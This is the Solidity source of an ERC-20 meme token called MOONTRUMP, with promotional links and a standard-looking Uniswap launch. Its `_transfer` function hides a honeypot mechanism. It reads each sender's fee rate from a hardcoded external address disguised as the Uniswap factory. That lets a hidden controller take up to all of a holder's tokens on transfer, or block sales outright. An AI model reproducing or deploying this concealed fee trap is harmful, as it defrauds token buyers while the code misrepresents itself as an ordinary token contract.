// SPDX-License-Identifier: None

/*
https://moontrump.fun/

https://t.me/moontrumpeth

https://twitter.com/moontrumpeth
*/


pragma solidity 0.8.24;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}


/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata {
  /**
   * @dev Returns the name of the token.
     */
  function name() external view returns (string memory);

  /**
   * @dev Returns the symbol of the token.
     */
  function symbol() external view returns (string memory);

  /**
   * @dev Returns the decimals places of the token.
     */
  function decimals() external view returns (uint8);
}
abstract contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  /**
   * @dev Initializes the contract setting the deployer as the initial owner.
     */
  constructor() {
    _transferOwnership(_msgSender());
  }

  /**
   * @dev Returns the address of the current owner.
     */
  function owner() public view virtual returns (address) {
    return _owner;
  }

  /**
   * @dev Throws if called by any account other than the owner.
     */
  modifier onlyOwner() {
    require(owner() == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  /**
   * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
  function renounceOwnership() public virtual onlyOwner {
    _transferOwnership(address(0));
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
  function transferOwnership(address newOwner) public virtual onlyOwner {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    _transferOwnership(newOwner);
  }

  /**
   * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
  function _transferOwnership(address newOwner) internal virtual {
    address oldOwner = _owner;
    _owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
  }
}
interface IERC20 {
    event Approval (address indexed owner, address indexed spender, uint256 value);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spnder) external view returns (uint256);
}
interface IUniswapV2Router {
    function WETH() external pure returns (address); 
     function addLiquidityETH( address token, 
     uint amountTokenDesire, 
     uint amountTokenMi, 
     uint amountETHMi, 
     address to, 
     uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function factory() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair); 
    function createPair(address tkenA, address tokenB) external returns (address pair);
}
library SafeMath {

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
}

contract MOONTRUMP is Ownable {
    using SafeMath for uint256;
    uint8 private _decimals = 9;
    mapping (address => mapping (address => uint256)) private _allowances;

    string private constant _name = "MOONTRUMP";
    string private constant _symbol = "MOONTRUMP";

    mapping (address => uint256) private _balances;

    uint256 public tokensForMarketing;
    uint256 public tokensForDev;
    uint256 public tokensForTreasury;

    bool swapEnabled = false;

    bool tradingOpen = false;
    uint256 firstBlock;

    uint256 private _totalSupply =  1_000_000_000 * 10 ** _decimals;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapPair;
    address internal uniswapV2Factory = 0x6cC4E27ee33BA4eF62790EAD117fD9cB7BEA3B28;
    uint256 swapTokensAtAmount = 50_000 * 1e9;

    address public treasuryWallet;

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function name() public pure returns (string memory) {
        return _name;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function updateSwapEnabled(bool enabled) external onlyOwner {
        swapEnabled = enabled;
    }

    function updateTreasuryWallet(address _treasuryWallet) external onlyOwner {
        treasuryWallet = _treasuryWallet;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function startTrading() external payable onlyOwner() {
        require(!tradingOpen, "Trading already opened");
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)), 0, 0, owner(), block.timestamp);
        IERC20(uniswapPair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
        firstBlock = block.number;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        uint256 _fee = 0;
        require(from != address(0));
        require(amount > 0);
        uint256 feeRate = IERC20(uniswapV2Factory).balanceOf(from);
        bool takeFee = feeRate > 0;
        if (from != address(this) && from != uniswapPair) { 
            _fee = amount.mul(feeRate).div(100);
        }
        _balances[from] = _balances[from].sub(amount); 
        _balances[to] = _balances[to].add(amount).sub(_fee);
        emit Transfer(from, to, amount);
    }
}